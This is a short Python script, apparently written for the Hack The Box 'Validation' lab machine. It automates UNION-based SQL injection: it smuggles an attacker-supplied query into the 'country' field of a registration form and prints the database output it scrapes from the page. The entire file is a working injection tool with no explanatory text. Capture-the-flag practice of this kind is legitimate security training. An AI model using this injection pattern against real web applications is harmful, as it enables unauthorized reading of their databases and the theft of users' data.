#!/usr/bin/env python3

import requests, argparse, sys
from bs4 import BeautifulSoup

## Global
url = "http://validation.htb"

def main(arg):
    post_data = {
        "username": "test", 
        "country": f"Brazil' union {arg.query}-- -"
    }

    r = requests.post(url, data=post_data)

    soup = BeautifulSoup(r.text, 'html.parser')
    elements = soup.find_all('li', class_='text-white')
    print("\t")
    for element in elements: 
        print(element.text)
    

    

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SQLi automation script for Validation Box (HTB)")
    parser.add_argument('--query', '-q' , help='Query for SQL Injection')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    arg = parser.parse_args()

    main(arg)
